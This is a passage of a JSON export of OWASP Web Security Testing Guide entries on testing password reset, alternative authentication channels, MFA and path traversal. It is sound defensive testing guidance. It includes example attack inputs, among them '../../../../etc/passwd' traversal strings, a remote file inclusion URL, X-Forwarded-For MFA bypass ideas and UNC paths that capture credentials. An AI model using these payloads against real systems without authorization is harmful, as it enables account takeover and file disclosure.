link contain a user ID?Sometimes the password reset link may include a user ID as well as a token, such asreset.php?userid=1&token=123456. In this case, it may be possible to modify theuseridparameter to reset other users’ passwords.</li><li>Can you inject a different host header?If the application trusts the value of theHostheader and uses this to generate the password reset link, it may be possible to steal tokens by injecting a modifiedHostheader into the request. See theTesting for Host Header Injectionguide for further information.</li><li>Is the link exposed to third parties?If the page that the user is taken to includes content from other parties (such as loading scripts from other domains), then the reset token in the URL may be exposed in the HTTPRefererheader sent in these requests. TheReferrer-PolicyHTTP header can be used to protect against this, so check if one is defined for the page.Additionally, if the page includes any tracking, analytics or advertising scripts, the token will also be exposed to them.</li><li>Are the emails sent from a domain with anti-spoofing protection?The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.</li><li>Is email considered sufficiently secure?Emails are typically sent unencrypted, and in many cases the user’s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.</li></ul><p>Does the link use HTTPS?</p><p>If the token is sent over unencrypted HTTP, it may be possible for an attacker to intercept it.</p><p>Can the link be used multiple times?</p><p>Links should expire after they are used, otherwise they provide a persistent backdoor for the account.</p><p>Does the link expire if it remains unused?</p><p>Links should be time limited. Exactly how long is appropriate will depend on the site, but it should rarely be more than an hour.</p><p>Is the token sufficiently long and random?</p><p>The security of the process is entirely reliant on an attacker not being able to guess or brute-force a token. The tokens should be generated with a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long that it is impractical for an attacker to guess or brute-force. At least 128 bits (or 32 hex characters) is a sufficient minimum to make such an online attack impractical.</p><p>Tokens should never be generated based on known values, such as by taking the MD5 hash of the user’s email with md5($email) , or using GUIDs which may use insecure PRNG functions, or may not even be random depending on the type.</p><p>An alternative approach to random tokens is to use a cryptographically signed token such as a JWT. In this case, the usual JWT checks should be carried out (is the signature verified, can the “nONe” algorithm be used, can the HMAC key be brute-forced, etc). See the Testing JSON Web Tokens guide for further information.</p><p>Does the link contain a user ID?</p><p>Sometimes the password reset link may include a user ID as well as a token, such as reset.php?userid=1&token=123456 . In this case, it may be possible to modify the userid parameter to reset other users’ passwords.</p><p>Can you inject a different host header?</p><p>If the application trusts the value of the Host header and uses this to generate the password reset link, it may be possible to steal tokens by injecting a modified Host header into the request. See the Testing for Host Header Injection guide for further information.</p><p>Is the link exposed to third parties?</p><p>If the page that the user is taken to includes content from other parties (such as loading scripts from other domains), then the reset token in the URL may be exposed in the HTTP Referer header sent in these requests. The Referrer-Policy HTTP header can be used to protect against this, so check if one is defined for the page.</p><p>Additionally, if the page includes any tracking, analytics or advertising scripts, the token will also be exposed to them.</p><p>Are the emails sent from a domain with anti-spoofing protection?</p><p>The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.</p><p>Is email considered sufficiently secure?</p><p>Emails are typically sent unencrypted, and in many cases the user’s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.</p><p>Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.</p><p>Rather than sending a token in an email, an alternative approach is to send it via SMS or an automated phone call, which the user will then enter on the application. The key areas to test are:</p><ul><li>Is the token sufficiently long and random?Tokens sent this way are typically shorter, as they are intended to be manually typed by the user, rather than being embedded in a link. It’s fairly common for applications to use six numeric digits, which only provides ~20 bits of security (feasible for an online brute-force attack), rather than the typically longer email token.This makes it much more important that the password reset functionality is protected against brute-force attacks.</li><li>Can the token be used multiple times?Tokens should be invalidated after they are used, otherwise they provide a persistent backdoor for the account.</li><li>Does the token expire if it remains unused?As the shorter tokens are more susceptible to brute-force attacks, a shorter expiration time should be implemented to limit the window available for an attacker to carry out an attack.</li><li>Are appropriate rate limiting and restrictions in place?Sending an SMS or triggering an automated phone call to a user is significantly more disruptive than sending an email, and could be used to harass a user, or even carry out a denial of service attack against their phone. The application should implement rate limiting to prevent this.Additionally, SMS messages and phone calls often incur financial costs for the sending party. If an attacker is able to cause a large number of messages to be sent, this could result in significant costs for the website operator. This is especially true if they are sent to international or premium rate numbers. However, allowing international numbers may be a requirement of the application.</li><li>Is SMS or a phone call considered sufficiently secure?A variety of attackshave been demonstrated that would allow an attacker to effectively hijack SMS messages, there are conflicting views about whether SMS is sufficiently secure to be used as an authentication factor.It is usually possible to answer an automated phone call with physical access to a device, without needing any kind of PIN or fingerprint to unlock the phone. In some circumstances (such as a shared office environment), this could allow an internal attacker to trivially reset another user’s password by walking over to their desk when they are out of office.Consider whether SMS or automated phone calls are appropriate, based on the context of the application that is being tested.</li></ul><p>Is the token sufficiently long and random?</p><p>Tokens sent this way are typically shorter, as they are intended to be manually typed by the user, rather than being embedded in a link. It’s fairly common for applications to use six numeric digits, which only provides ~20 bits of security (feasible for an online brute-force attack), rather than the typically longer email token.</p><p>This makes it much more important that the password reset functionality is protected against brute-force attacks.</p><p>Can the token be used multiple times?</p><p>Tokens should be invalidated after they are used, otherwise they provide a persistent backdoor for the account.</p><p>Does the token expire if it remains unused?</p><p>As the shorter tokens are more susceptible to brute-force attacks, a shorter expiration time should be implemented to limit the window available for an attacker to carry out an attack.</p><p>Are appropriate rate limiting and restrictions in place?</p><p>Sending an SMS or triggering an automated phone call to a user is significantly more disruptive than sending an email, and could be used to harass a user, or even carry out a denial of service attack against their phone. The application should implement rate limiting to prevent this.</p><p>Additionally, SMS messages and phone calls often incur financial costs for the sending party. If an attacker is able to cause a large number of messages to be sent, this could result in significant costs for the website operator. This is especially true if they are sent to international or premium rate numbers. However, allowing international numbers may be a requirement of the application.</p><p>Is SMS or a phone call considered sufficiently secure?</p><p>A variety of attacks have been demonstrated that would allow an attacker to effectively hijack SMS messages, there are conflicting views about whether SMS is sufficiently secure to be used as an authentication factor.</p><p>It is usually possible to answer an automated phone call with physical access to a device, without needing any kind of PIN or fingerprint to unlock the phone. In some circumstances (such as a shared office environment), this could allow an internal attacker to trivially reset another user’s password by walking over to their desk when they are out of office.</p><p>Consider whether SMS or automated phone calls are appropriate, based on the context of the application that is being tested.</p><p>Rather than sending them a link or new password, security questions can be used as a mechanism to authenticate the user. This is considered to be a weak approach, and should not be used if better options are available.</p><p>See the Testing for Weak Security Questions guide for further information.</p><p>If the application supports the ability to modify an account’s primary identifier (such as an email address or phone number) that is utilized in the password change and reset functionalities the user should be forced to re-authenticate. When the primary identifier used in the password change functionality is able to be modified without re-authentication it allows the re-authentication in the password change functionality to be bypassed. Overall, anything that impacts the security of the account (email, MFA, backup settings, etc.) should require re-authentication before it can be modified.</p><p>For example: An application has a password reset flow that sends a reset link to the account’s email address. The application also requires re-authentication if the password is attempted to be changed from the perspective of an authenticated user. If an attacker gains access to the account (via a stolen cookie, physical access to the computer, etc.) and changes the account’s email address without needing to re-authenticate, then the password reset flow can be used to change the password, bypassing the authenticated password change flow.</p><p>Once the user has proved their identity (either through a password reset link, a recovery code, or by logging in on the application) they should be able to change their password. The key areas to test are:</p><ul><li>When setting the password, can you specify the user ID?If the user ID is included in the password reset request and is not validated, it may be possible to modify it and change other users’ passwords.</li><li>Is the user required to re-authenticate?If a logged-in user tries to change their password, they should be asked to re-authenticate with their current password in order to protect against an attacker gaining temporary access to an unattended session. If the user has MFA enabled, then they would typically re-authenticate with that, rather than their password.</li><li>Is the password change form vulnerable to CSRF?If the user isn’t required to re-authenticate, then it may be possible to carry out a CSRF attack against the password reset form, allowing their account to be compromised. See theTesting for Cross-Site Request Forgeryguide for further information.</li><li>Is a strong and effective password policy applied?The password policy should be consistent across the registration, password change, and password reset functionality. See theTesting for Weak Authentication Methodsguide for further information.</li></ul><p>When setting the password, can you specify the user ID?</p><p>If the user ID is included in the password reset request and is not validated, it may be possible to modify it and change other users’ passwords.</p><p>Is the user required to re-authenticate?</p><p>If a logged-in user tries to change their password, they should be asked to re-authenticate with their current password in order to protect against an attacker gaining temporary access to an unattended session. If the user has MFA enabled, then they would typically re-authenticate with that, rather than their password.</p><p>Is the password change form vulnerable to CSRF?</p><p>If the user isn’t required to re-authenticate, then it may be possible to carry out a CSRF attack against the password reset form, allowing their account to be compromised. See the Testing for Cross-Site Request Forgery guide for further information.</p><p>Is a strong and effective password policy applied?</p><p>The password policy should be consistent across the registration, password change, and password reset functionality. See the Testing for Weak Authentication Methods guide for further information.</p><h3>References</h3><ul><li>OWASP Forgot Password Cheat Sheet</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHN-10": {
        "summary": "<h3>Summary</h3><p>Even if the primary authentication mechanisms do not include any vulnerabilities, it may be that vulnerabilities exist in alternative legitimate authentication user channels for the same user accounts. Tests should be undertaken to identify alternative channels and, subject to test scoping, identify vulnerabilities.</p><p>The alternative user interaction channels could be utilized to circumvent the primary channel, or expose information that can then be used to assist an attack against the primary channel. Some of these channels may themselves be separate web applications using different hostnames or paths. For example:</p><ul><li>Standard website</li><li>Mobile, or specific device, optimized website</li><li>Accessibility optimized website</li><li>Alternative country and language websites</li><li>Parallel websites that utilize the same user accounts (e.g. another website offering different functionally of the same organization, a partner website with which user accounts are shared)</li><li>Development, test, UAT and staging versions of the standard website</li></ul><p>But they could also be other types of application or business processes:</p><ul><li>Mobile device app</li><li>Desktop application</li><li>Call center operators</li><li>Interactive voice response or phone tree systems</li></ul><p>Note that the focus of this test is on alternative channels; some authentication alternatives might appear as different content delivered via the same website and would almost certainly be in scope for testing. These are not discussed further here, and should have been identified during information gathering and primary authentication testing. For example:</p><ul><li>Progressive enrichment and graceful degradation that change functionality</li><li>Site use without cookies</li><li>Site use without JavaScript</li><li>Site use without plugins such as for Flash and Java</li></ul><p>Even if the scope of the test does not allow the alternative channels to be tested, their existence should be documented. These may undermine the degree of assurance in the authentication mechanisms and may be a precursor to additional testing.</p><h3>Example</h3><p>The primary website is https://www.example.com and authentication functions always take place on pages using TLS https://www.example.com/myaccount/ .</p><p>However, a separate mobile-optimized website exists that does not use TLS at all, and has a weaker password recovery mechanism https://m.example.com/myaccount/ .</p><h3>Test Objectives</h3><ul><li>Identify alternative authentication channels.</li><li>Assess the security measures used and if any bypasses exists on the alternative channels.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Fully test the website’s primary authentication functions. This should identify how accounts are issued, created or changed and how passwords are recovered, reset, or changed. Additionally knowledge of any elevated privilege authentication and authentication protection measures should be known. These precursors are necessary to be able to compare with any alternative channels.</p><p>Other channels can be found by using the following methods:</p><ul><li>Reading site content, especially the home page, contact us, help pages, support articles and FAQs, T&Cs, privacy notices, the robots.txt file and any sitemap.xml files.</li><li>Searching HTTP proxy logs, recorded during previous information gathering and testing, for strings such as “mobile”, “android”, blackberry”, “ipad”, “iphone”, “mobile app”, “e-reader”, “wireless”, “auth”, “sso”, “single sign on” in URL paths and body content.</li><li>Use search engines to find different websites from the same organization, or using the same domain name, that have similar home page content or which also have authentication mechanisms.</li></ul><p>For each possible channel confirm whether user accounts are shared across these, or provide access to the same or similar functionality.</p><p>For each alternative channel where user accounts or functionality are shared, identify if all the authentication functions of the primary channel are available, and if anything extra exists. It may be useful to create a grid like the one below:</p><p>In this example, mobile has an extra function “change password” but does not offer “log out”. A limited number of tasks are also possible by phoning the call center. Call centers can be interesting, because their identity confirmation checks might be weaker than the website’s, allowing this channel to be used to aid an attack against a user’s account.</p><p>While enumerating these it is worth taking note of how session management is undertaken, in case there is overlap across any channels (e.g. cookies scoped to the same parent domain name, concurrent sessions allowed across channels, but not on the same channel).</p><p>Alternative channels should be mentioned in the testing report, even if they are marked as “information only” or “out of scope”. In some cases the test scope might include the alternative channel (e.g. because it is just another path on the target host name), or may be added to the scope after discussion with the owners of all the channels. If testing is permitted and authorized, all the other authentication tests in this guide should then be performed, and compared against the primary channel.</p><h3>Related Test Cases</h3><p>The test cases for all the other authentication tests should be utilized.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Ensure a consistent authentication policy is applied across all channels so that they are equally secure.</p>",
        "test_objectives": ""
    },
    "WSTG-ATHN-11": {
        "summary": "<h3>Summary</h3><p>Many applications implement Multi-Factor Authentication (MFA) as an additional layer of security to protect the login process. This is also known as two-factor authentication (2FA) or two-step verification (2SV) - although these are not strictly the same thing. MFA means asking the user to provide at least two different authentication factors when logging in.</p><p>MFA adds additional complexity to both the authentication functionality, and also to other security-related areas (such as credential management and password recovery), meaning that it is critical for it to be implemented in a correct and robust manner.</p><h3>Test Objectives</h3><ul><li>Identify the type of MFA used by the application.</li><li>Determine whether the MFA implementation is robust and secure.</li><li>Attempt to bypass the MFA.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>MFA means that at least two of the following factors are required to authentication:</p><p>* Email only really constitutes “something you have” if the email account itself is protected with MFA. As such, it should be considered weaker than other alternatives such as certificates or TOTP, and may not be accepted as MFA under some definitions.</p><p>Note that requiring multiple examples of a single factor (such as needing both a password and a PIN) does not constitute MFA , although it may provide some security benefits over a simple password, and may be considered two-step verification (2SV).</p><p>Due to the complexity of implementing biometrics in a browser-based environment, “Something You Are” is rarely used for web applications, although it is starting to be adopted using standards such as WebAuthn. The most common second factor is “Something You Have”.</p><p>The first step for testing MFA is to identify all of the authentication functionality in the application, which may include:</p><ul><li>The main login page.</li><li>Security critical functionality (such as disabling MFA or changing a password).</li><li>Federated login providers.</li><li>API endpoints (from both the main web interface and mobile apps).</li><li>Alternative (non-HTTP) protocols.</li><li>Test or debug functionality.</li></ul><p>All of the different login methods should be reviewed, to ensure that MFA is enforced consistently. If some methods do not require MFA, then these can provide a simple method to bypass them.</p><p>If the authentication is done in multiple steps then it may be possible to bypass it by completing the first step of the authentication process (entering the username and password), and then force-browsing to the application or making direct API requests without completing the second stage (entering the MFA code).</p><p>If the authentication is using a OpenID Connect (OIDC) provider that allows custom authentication flows (or policies) such as Azure B2C, there may be multiple flows defined, some of which may not require MFA. For example if the application authenticates with a flow called B2C_1_SignInWithMFA , then try tampering that to B2C_1_SignIn , B2C_1_SignInWithoutMFA or other similar values.</p><p>In some cases, there may also be intentional MFA bypasses implemented, such as not requiring MFA:</p><ul><li>From specific IP addresses (which may be spoofable using theX-Forwarded-ForHTTP header).</li><li>When a specific HTTP header is set (such as a non-standard header likeX-Debug).</li><li>For a specific hard-coded account (such as a “root” or “breakglass” account).</li></ul><p>Where an application supports both local and federated logins, it may be possible to bypass the MFA if there is no strong separation between these two types of accounts. For example, if a user registers a local account and configures MFA for it, but does not have MFA configured on their account on the federated login provider, it may be possible for an attacker to re-register (or link) a federated account on the target application with the same email address by compromising the user’s account on the federated login provider.</p><p>Finally, if the MFA is implemented on a different system to the main application (such as on a reverse proxy, in order to protect a legacy application that does not natively support MFA), then it may be possible to bypass it by connecting directly to the backend application server, as discussed in the guide on how to map the application architecture .</p><p>The functionality used to manage MFA from inside the user’s account should be tested for vulnerabilities, including:</p><ul><li>Is the user required to re-authenticate to remove or change MFA settings?</li><li>Is the MFA management functionality vulnerable tocross-site request forgery?</li><li>Can other users’ MFA setting be modified throughIDOR vulnerabilities?</li></ul><p>Many applications will provide users with a way to regain access to their account if they are unable to authenticate with their second factor (for example if they have lost their phone). These mechanisms can often represent a significant weakness in the application, as they effectively allow the second authentication factor to be bypassed.</p><p>Some applications will provide the user with a list of recovery or backup codes when they enable MFA, which can be used to login. These should be checked to ensure:</p><ul><li>They are sufficiently long and complex to protect against brute-force attacks.</li><li>They are securely generated.</li><li>They can only be used once.</li><li>Brute-force protection is in place (such as account lockout).</li><li>The user is notified (via email, SMS, etc) when a code is used.</li></ul><p>See the “Backup Codes” section in the Forgotten Password Cheat Sheet for further details.</p><p>If the application implements an MFA reset process, this should be tested in the same way that the password reset process is tested. It is important that this process is at least as strong as the MFA implementation for the application.</p><p>Some applications will allow the user to prove their identity through other means, such as the use of security questions . This usually represents a significant weakness, as security questions provide a far lower level of security than MFA.</p><p>The most common form of MFA is the one of One-Time Passwords (OTPs), which are typically six-digit numeric codes (although they can be longer or shorter). These can either be generated by both the server and the user (for example, with an authenticator app), or can be generated on the server and sent to the user. There are various ways that this OTP can be provided to the user, including:</p><p>The OTP is typically entered after the user has provided their username and password. There are various checks that should be performed, including:</p><ul><li>Is the account locked out after multiple failed MFA attempts?</li><li>Is the user’s IP address blocked after multiple failed MFA attempts across different accounts?</li><li>Are failed MFA attempts logged?</li><li>Is the form vulnerable to injection attacks, includingSQL wildcard injection?</li></ul><p>Depending on the type of OTPs used, there are also some other specific checks that should be performed:</p><ul><li>How are OTPs sent to user (email, SMS, phone, etc)Is there rate limiting to prevent SMS/phone spam costing money?</li><li>Is there rate limiting to prevent SMS/phone spam costing money?</li><li>How strong are OTPs (length and keyspace)?</li><li>How long are OTPs valid for?</li><li>Are multiple OTPs valid at once?</li><li>Can the OTPs be used more than once?</li><li>Are the OTPs tied to the correct user account or is it possible to authenticate with them on other accounts?</li></ul><ul><li>Is there rate limiting to prevent SMS/phone spam costing money?</li></ul><p>HOTP and TOTP codes are both based on a secret that is shared between the server and the user. For TOTP codes, this is usually provided to the user in the form of a QR code that they scan with an authenticator app (although it can also be provided as a text secret for them to manually enter).</p><p>Where the secret is generated on the server, it should be checked to ensure that it is sufficiently long and complex ( RFC 4226 recommends at least 160 bits), and that it is generated using a secure random function .</p><p>Where the secret can be provided by the user, an appropriate minimum length should be enforced, and the input should be checked for the usual injection attacks.</p><p>TOTP codes are typically valid for 30 seconds, but some applications choose to accept multiple codes (such as the previous, current, and next codes) in order to deal with differences between the system time on the server and on the user’s device. Some applications may allow multiple codes on either side of the current one, which may make it easier for an attacker to guess or brute-force the code. The table below shows the chance of successfully brute-forcing an OTP code based on an attacker being able to make 10 requests a second, for applications that accept either only the current code, or multiple codes (see this article for the calculations behind the table).</p><p>Where codes are generated by the server and sent to the client, the following areas should be considered:</p><ul><li>Is the transport mechanism (email, SMS, or voice) secure enough for the application?</li><li>Are the codes sufficiently long and complex?</li><li>Are the codes generated using asecure random function?</li><li>How long are the codes valid for?</li><li>Are multiple codes valid at once, or does generating a new code invalidate the previous one?Could this be used to block access to an account by repeatedly requesting codes?</li><li>Could this be used to block access to an account by repeatedly requesting codes?</li><li>Is there sufficient rate-limiting to prevent an attacker requesting large numbers of codes?Large numbers of emailed code may get the server blocked for sending spam.Large numbers of SMS or voice calls may cost money, or be used to harass a user.</li><li>Large numbers of emailed code may get the server blocked for sending spam.</li><li>Large numbers of SMS or voice calls may cost money, or be used to harass a user.</li></ul><ul><li>Could this be used to block access to an account by repeatedly requesting codes?</li></ul><ul><li>Large numbers of emailed code may get the server blocked for sending spam.</li><li>Large numbers of SMS or voice calls may cost money, or be used to harass a user.</li></ul><p>An alternative approach to OTP codes is to send a push notification to the user’s mobile phone, which they can either approve or deny. This method is less common, as it requires the user to install an application-specific authenticator.</p><p>Properly evaluating the security of this requires the scope of testing to be expanded to cover both the mobile app, and any supporting APIs or services used by it; meaning that it would often be outside of the scope of a traditional web application test. However, there are a couple of simple checks that can be performed without testing the mobile app, including:</p><ul><li>Does the notification provide sufficient context (IP addresses, location, etc) for the user to make an informed decision about whether to approve or deny it?</li><li>Is there any kind of challenge and response mechanism (such as providing a code on the site that the user needs to enter into the app - often called “number matching” or “number challenge”)?</li><li>Is there any rate limiting or mechanisms to prevent the user from being spammed with notifications in the hope that they will just blindly accept one?</li></ul><p>One of the factors that is sometimes used with MFA is location (“somewhere you are”), although whether this constitutes a proper authentication factor is debatable. In the context of a web application, this typically means restricting access to specific IP addresses, or not prompting the user for a second factor as long as they are connecting from a specific trusted IP address. A common scenario for this would be to authenticate users with just their password when connecting from the office IP ranges, but requiring an OTP code when they connect from elsewhere.</p><p>Depending on the implementation, it may be possible for a user to spoof a trusted IP address by setting the X-Forwarded-For header, which could allow them to bypass this check. Note that if the application does not correctly sanitize the contents of this header, it may also be possible to carry out attack such as SQL injection here. If the application supports IPv6, then this should also be checked to ensure that appropriate restrictions are applied to those connections.</p><p>Additionally, the trusted IP addresses should be reviewed to ensure that they do not present any weaknesses, such as if they include:</p><ul><li>IP addresses that could be accessible by untrusted users (such as the guest wireless networks in an office).</li><li>Dynamically assigned IP address that could change.</li><li>Public network ranges where an attacker could host their own system (such as Azure or AWS).</li></ul><p>Transport Layer Security (TLS) is commonly used to encrypt traffic between the client and the server, and to provide a mechanism for the client to confirm the identity of the server (by comparing Common Name (CN) or Subject Alternative Name (SAN) on the certificate to the requested domain). However, it can also provide a mechanism for the server to confirm the identity of the client, known as client certificate authentication or mutual TLS (mTLS). A full discussion of client certificate authentication is outside of the scope of this guide, but the key principle is that the user presents a digital certificate (stored either on their machine or on a smartcard), which is validated by the server.</p><p>The first step when testing is to determine whether the target application restricts the Certificate Authorities (CAs) that are trusted to issue certificates. This information can be obtained using various tools, or by manually examining the TLS handshake. The simplest way is to use OpenSSL’s s_client :</p><pre><code>$ openssl s_client -connect example:443 [ ...]\nAcceptable client certificate CA names\nC = US, ST = Example, L = Example, O = Example Org, CN = Example Org Root Certificate Authority\nClient Certificate Types: RSA sign, DSA sign, ECDSA sign</code></pre><p>If there are no restrictions, then it may be possible to authenticate using a certificate from a different CA. If there are restrictions but they are badly implemented, it may be possible to create a local CA with the correct name (“Example Org Root Certificate Authority” in the example above), and to use this new CA to sign client certificates.</p><p>If a valid certificate can be obtained, then it should also be verified that the certificate can only be used for the user that it is issued for (i.e, that you can’t use a certificate issued to Alice to authenticate on Bob’s account). Additionally, certificates should be checked to ensure that they have neither expired nor been revoked.</p><h3>Related Test Cases</h3><ul><li>Testing for Weak Lock Out Mechanism</li><li>Testing for Weak Password Change or Reset Functionalities</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Ensure that:</p><ul><li>MFA is implemented for all relevant accounts and functionality on the applications.</li><li>The support MFA methods are appropriate for the application.</li><li>The mechanisms used to implement MFA are appropriately secured and protected against brute-force attacks.</li><li>There is appropriate auditing and logging for all MFA-related activity.</li></ul><p>See the OWASP Multi-Factor Authentication Cheat Sheet for further recommendations.</p><h3>References</h3><ul><li>OWASP Multi-Factor Authentication Cheat Sheet</li></ul>",
        "test_objectives": ""
    },
    "WSTG-ATHZ-01": {
        "summary": "<h3>Summary</h3><p>Many web applications use and manage files as part of their daily operation. Using input validation methods that have not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not intended to be accessible. In particular situations, it could be possible to execute arbitrary code or system commands.</p><p>Traditionally, web servers and web applications implement authentication mechanisms to control access to files and resources. Web servers try to confine users’ files inside a “root directory” or “web document root”, which represents a physical directory on the file system. Users have to consider this directory as the base directory into the hierarchical structure of the web application.</p><p>The definition of the privileges is made using Access Control Lists (ACL) which identify which users or groups are supposed to be able to access, modify, or execute a specific file on the server. These mechanisms are designed to prevent malicious users from accessing sensitive files (for example, the common /etc/passwd file on a UNIX-like platform) or to avoid the execution of system commands.</p><p>Many web applications use server-side scripts to include different kinds of files. It is quite common to use this method to manage images, templates, load static texts, and so on. Unfortunately, these applications expose security vulnerabilities if input parameters (i.e., form parameters, cookie values) are not correctly validated.</p><p>In web servers and web applications, this kind of problem arises in path traversal/file include attacks. By exploiting this kind of vulnerability, an attacker is able to read directories or files which they normally couldn’t read, access data outside the web document root, or include scripts and other kinds of files from external sites.</p><p>For the purpose of the OWASP Testing Guide, only the security threats related to web applications will be considered and not threats to web servers (e.g., the infamous %5c escape code into Microsoft IIS web server). Further reading suggestions will be provided in the references section for interested readers.</p><p>This kind of attack is also known as the dot-dot-slash attack ( ../ ), directory traversal, directory climbing, or backtracking.</p><p>During an assessment, to discover path traversal and file include flaws, testers need to perform two different stages:</p><h3>Test Objectives</h3><ul><li>Identify injection points that pertain to path traversal.</li><li>Assess bypassing techniques and identify the extent of path traversal.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST queries and common options like file uploads and HTML forms.</p><p>Here are some examples of the checks to be performed at this stage:</p><ul><li>Are there request parameters which could be used for file-related operations?</li><li>Are there unusual file extensions?</li><li>Are there interesting variable names?https://example.com/getUserProfile.jsp?item=ikki.htmlhttps://example.com/index.php?file=contenthttps://example.com/main.cgi?home=index.htm</li><li>https://example.com/getUserProfile.jsp?item=ikki.html</li><li>https://example.com/index.php?file=content</li><li>https://example.com/main.cgi?home=index.htm</li><li>Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flowerCookie: USER=1826cc8f:PSTYLE=GreenDotRed</li><li>Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower</li><li>Cookie: USER=1826cc8f:PSTYLE=GreenDotRed</li></ul><ul><li>https://example.com/getUserProfile.jsp?item=ikki.html</li><li>https://example.com/index.php?file=content</li><li>https://example.com/main.cgi?home=index.htm</li></ul><ul><li>Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower</li><li>Cookie: USER=1826cc8f:PSTYLE=GreenDotRed</li></ul><p>The next stage of testing is analyzing the input validation functions present in the web application. Using the previous example, the dynamic page called getUserProfile.jsp loads static information from a file and shows the content to users. An attacker could insert the malicious string ../../../../etc/passwd to include the password hash file of a Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file system privileges, the web application itself must be able to read the file.</p><p>Note: To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting /etc/passwd from an IIS web server.</p><pre><code>https://example.com/getUserProfile.jsp?item=../../../../etc/passwd</code></pre><p>Another common example is including content from an external source:</p><pre><code>https://example.com/index.php?file=https://www.owasp.org/malicioustxt</code></pre><p>The same can be applied to cookies or any other input vector that is used for dynamic page generation.</p><p>More file inclusion payloads can be found at PayloadsAllTheThings - File Inclusion</p><p>It is important to note that different operating systems use different path separators</p><ul><li>Unix-like OS:root directory:/directory separator:/</li><li>root directory:/</li><li>directory separator:/</li><li>Windows OS:root directory:<drive letter>:directory separator:\\or/</li><li>root directory:<drive letter>:</li><li>directory separator:\\or/</li><li>Classic macOS:root directory:<drive letter>:directory separator::</li><li>root directory:<drive letter>:</li><li>directory separator::</li></ul><ul><li>root directory:/</li><li>directory separator:/</li></ul><ul><li>root directory:<drive letter>:</li><li>directory separator:\\or/</li></ul><ul><li>root directory:<drive letter>:</li><li>directory separator::</li></ul><p>It’s a common mistake by developers to not expect every form of encoding and therefore only do validation for basic encoded content. If at first the test string isn’t successful, try another encoding scheme.</p><p>You can find encoding techniques and ready to use directory traversal payloads at PayloadsAllTheThings - Directory Traversal</p><ul><li>Windows shell: Appending any of the following to paths used in a shell command results in no difference in function:Angle brackets<and>at the end of the pathDouble quotes (closed properly) at the end of the pathExtraneous current directory markers such as./or.\\\\Extraneous parent directory markers with arbitrary items that may or may not exist:file.txtfile.txt...file.txt<spaces>file.txt\"\"\"\"file.txt<<<>>><./././file.txtnonexistant/../file.txt</li><li>Angle brackets<and>at the end of the path</li><li>Double quotes (closed properly) at the end of the path</li><li>Extraneous current directory markers such as./or.\\\\</li><li>Extraneous parent directory markers with arbitrary items that may or may not exist:file.txtfile.txt...file.txt<spaces>file.txt\"\"\"\"file.txt<<<>>><./././file.txtnonexistant/../file.txt</li><li>file.txt</li><li>file.txt...</li><li>file.txt<spaces></li><li>file.txt\"\"\"\"</li><li>file.txt<<<>>><</li><li>./././file.txt</li><li>nonexistant/../file.txt</li><li>Windows API: The following items are discarded when used in any shell command or API call where a string is taken as a filename:periodsspaces</li><li>periods</li><li>spaces</li><li>Windows UNC Filepaths: Used to reference files on SMB shares. Sometimes, an application can be made to refer to files on a remote UNC filepath. If so, the Windows SMB server may send stored credentials to the attacker, which can be captured and cracked. These may also be used with a self-referential IP address or domain name to evade filters, or used to access files on SMB shares inaccessible to the attacker, but accessible from the web server.\\\\server_or_ip\\path\\to\\file.abc\\\\?\\server_or_ip\\path\\to\\file.abc</li><li>\\\\server_or_ip\\path\\to\\file.abc</li><li>\\\\?\\server_or_ip\\path\\to\\file.abc</li><li>Windows NT Device Namespace: Used to refer to the Windows device namespace. Certain references will allow access to file systems using a different path.May be equivalent to a drive letter such asc:\\, or even a drive volume without an assigned letter:\\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\Refers to the first disc drive on the machine:\\\\.\\CdRom0\\</li><li>May be equivalent to a drive letter such asc:\\, or even a drive volume without an assigned letter:\\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\</li><li>Refers to the first disc drive on the machine:\\\\.\\CdRom0\\</li></ul><ul><li>Angle brackets<and>at the end of the path</li><li>Double quotes (closed properly) at the end of the path</li><li>Extraneous current directory markers such as./or.\\\\</li><li>Extraneous parent directory markers with arbitrary items that may or may not exist:file.txtfile.txt...file.txt<spaces>file.txt\"\"\"\"file.txt<<<>>><./././file.txtnonexistant/../file.txt</li><li>file.txt</li><li>file.txt...</li><li>file.txt<spaces></li><li>file.txt\"\"\"\"</li><li>file.txt<<<>>><</li><li>./././file.txt</li><li>nonexistant/../file.txt</li></ul><ul><li>file.txt</li><li>file.txt...</li><li>file.txt<spaces></li><li>file.txt\"\"\"\"</li><li>file.txt<<<>>><</li><li>./././file.txt</li><li>nonexistant/../file.txt</li></ul><ul><li>periods</li><li>spaces</li></ul><ul><li>\\\\server_or_ip\\path\\to\\file.abc</li><li>\\\\?\\server_or_ip\\path\\to\\file.abc</li></ul><ul><li>May be equivalent to a drive letter such asc:\\, or even a drive volume without an assigned letter:\\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\</li><li>Refers to the first disc drive on the 